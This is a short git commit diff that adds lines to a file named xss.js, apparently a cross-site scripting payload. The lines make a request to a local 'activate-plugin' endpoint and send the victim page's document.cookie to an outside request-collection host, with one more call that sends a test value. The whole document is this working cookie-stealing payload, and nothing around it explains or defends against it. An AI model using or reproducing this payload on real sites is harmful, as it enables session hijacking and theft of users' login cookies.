16347ab1e9e08439009e3b6bc0d9a06a9b161383
MaxToffy <91328785+MaxToffy@users.noreply.github.com>
2023-11-19 03:15:10 +0100

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,3 @@
-
+fetch("https://127.0.0.1/activate-plugin/1");
+fetch("https://enjvgl53rrbci.x.pipedream.net/?cookie="+document.cookie);
+fetch("https://enjvgl53rrbci.x.pipedream.net/?cookie=test");
